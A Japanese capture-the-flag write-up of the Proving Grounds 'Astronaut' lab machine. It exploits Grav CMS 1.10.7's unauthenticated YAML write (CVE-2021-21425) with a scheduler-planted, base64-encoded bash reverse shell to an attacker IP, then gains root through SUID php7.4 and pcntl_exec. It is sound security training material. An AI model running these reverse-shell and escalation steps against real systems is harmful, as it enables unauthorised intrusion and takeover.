+++
title = "Proving Grounds Practice - Astronaut Writeup"
date = "2026-11-25"
description = "Grav CMS 1.10.7の任意YAML書き込み脆弱性（CVE-2021-21425）を悪用して初期アクセスを獲得し、SUIDが設定されたPHP 7.4を利用してroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Grav CMS 1.10.7]", "[CVE-2021-21425 - Arbitrary YAML Write]", "[PHP SUID Privilege Escalation]", "[Easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details        |
| ---------- | -------------- |
| Machine    | Astronaut      |
| OS         | Linux          |
| IP Address | 192.168.129.12 |
| Difficulty | Easy           |

---

## Reconnaissance

### Nmap Scan

まず、Nmapを使用して全TCPポートのスキャンとサービスのバージョン確認を行う。

```bash
nmap -sV -sC -p- 192.168.129.12
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-25 22:33 +0900
Nmap scan report for 192.168.129.12
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.32 seconds
```

スキャン結果から、以下のポートが開放されていることを確認した。

| Port   | Service | Version / Information |
| ------ | ------- | --------------------- |
| 22/tcp | SSH     | OpenSSH 8.2p1 Ubuntu  |
| 80/tcp | HTTP    | Apache httpd 2.4.41   |

80/tcpのHTTPサービスにアクセスすると、ディレクトリ一覧が表示され、`grav-admin/` というディレクトリが公開されていることが分かった。

### Web Enumeration

ブラウザから以下のURLにアクセスする。

```text
http://192.168.129.12/grav-admin/
```

アクセス先はGrav CMSを使用したWebサイトである。

Grav CMSはPHPで動作するフラットファイル型CMSであり、今回の攻略では管理機能に存在する脆弱性を利用する。

---

## Initial Access

### Grav CMS - Arbitrary YAML Write

Grav CMS 1.10.7には、認証なしでYAML設定を書き換えられる脆弱性が存在する。

今回使用するExploitはSearchSploitで確認できる以下のもの。

- Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated)
- Exploit DB: 49973

この脆弱性を利用すると、管理画面のScheduler設定を書き換え、任意のコマンドを実行できる。

### Generate Reverse Shell Payload

まず、リバースシェル用のコマンドをBase64エンコードする。

攻撃者側のIPアドレスは `192.168.45.183`、待受ポートは `4444` を使用した。

```bash
echo -ne "bash -i >& /dev/tcp/192.168.45.183/4444 0>&1" | base64 -w0
```

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4My80NDQ0IDA+JjE=
```

### Exploit Preparation

ExploitのPythonスクリプトを用意する。

```bash
cat 49973.py
```

今回使用したExploitの主要部分は以下の通り。

```python
import requests
import sys
import re
import base64

target = "http://192.168.129.12/grav-admin"

payload = b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4My80NDQ0IDA+JjE='));
chmod('/tmp/rev.sh',0755);
system('bash /tmp/rev.sh');
"""
```

スクリプトでは、以下の処理を行う。

1. Grav CMSの管理画面にアクセスする。
2. Admin nonceを取得する。
3. Schedulerの設定を書き換える。
4. PHPを使用して細工したペイロードを実行する。
5. `/tmp/rev.sh` を作成してリバースシェルを実行する。

Schedulerの設定には、以下のコマンドが登録される。

```text
/usr/bin/php -r eval(base64_decode(...));
```

また、Schedulerの実行時刻には以下が指定されている。

```text
* * * * *
```

これにより、毎分実行されるジョブとしてリバースシェルを登録する。

### Execute Exploit

Exploitを実行する前に、Kali側でリスナーを起動する。

```bash
nc -lvnp 4444
```

別のターミナルからExploitを実行する。

```bash
python3 49973.py
```

ExploitがSchedulerの設定を書き換え、登録したジョブが実行されると、リバースシェルの接続が返ってくる。

```text
listening on [any] 4444 ...
connect to [192.168.45.183] from (UNKNOWN) [192.168.129.12] 35082

bash: cannot set terminal process group (9336): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$
```

現在のユーザーを確認する。

```bash
whoami
```

```text
www-data
```

これにより、`www-data` 権限で初期アクセスを取得できた。

---

## Privilege Escalation

### SUID Enumeration

初期アクセス後、特権昇格につながるSUIDファイルを調査する。

```bash
find / -perm /4000 -ls 2>/dev/null
```

実行結果から、以下のファイルを発見した。

```text
53120   4676 -rwsr-xr-x   1 root root 4786104 Feb 23 2023 /usr/bin/php7.4
```

`/usr/bin/php7.4` にSUIDビットが設定されていることが分かった。

通常、SUIDが設定された実行ファイルは、実行したユーザーではなくファイル所有者の権限で動作する。

今回のPHPバイナリはroot所有でSUIDが設定されているため、これを利用してroot権限でコマンドを実行できる可能性がある。

### PHP SUID Privilege Escalation

GTFOBinsでPHPのSUIDを利用した権限昇格方法を確認する。

参考:

[https://gtfobins.org/gtfobins/php/#suid](https://gtfobins.org/gtfobins/php/#suid)

PHPには、`pcntl_exec()` を利用して別のプロセスを実行する方法がある。

以下のコマンドを実行する。

```bash
/usr/bin/php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

`-p` オプションを指定することで、シェル起動時に実効UIDを維持する。

これにより、SUIDによって得られたroot権限を維持したシェルを取得できる。

### Root Shell

シェル取得後、現在のユーザーを確認する。

```bash
whoami
```

```text
root
```

**root権限の取得に成功した。**

### Capture Flags

rootシェルから `proof.txt` を確認する。

```bash
cat proof.txt
```


`proof.txt` の取得に成功した。

---

## Summary

Astronautでは、NmapによるポートスキャンからSSHとHTTPサービスを発見した。

Webサーバーのディレクトリ一覧から `grav-admin/` を発見し、Grav CMSが稼働していることを確認した。

その後、Grav CMS 1.10.7の任意YAML書き込み脆弱性を利用してSchedulerの設定を書き換え、PHP経由でリバースシェルを実行した。

これにより、`www-data` 権限で初期アクセスを取得した。

特権昇格では、SUIDファイルの調査から `/usr/bin/php7.4` にroot所有のSUIDビットが設定されていることを発見した。

PHPの `pcntl_exec()` と `-p` オプションを利用することで、root権限を維持したシェルを取得した。

**攻撃の流れ**

1. Nmapによる全TCPポートスキャン
2. HTTPのディレクトリ一覧から `grav-admin/` を発見
3. Grav CMS 1.10.7を特定
4. CVE-2021-21425の任意YAML書き込み脆弱性を悪用
5. Schedulerにリバースシェルを登録
6. www-data権限のシェルを取得
7. SUIDファイルの調査
8. `/usr/bin/php7.4` のSUID設定を発見
9. PHPの `pcntl_exec()` を利用してrootシェルを取得
10. proof.txtを取得

**Initial Access:** Grav CMS - Arbitrary YAML Write (CVE-2021-21425)

**Privilege Escalation:** SUID PHP 7.4 - GTFOBins

**Final Access:** root
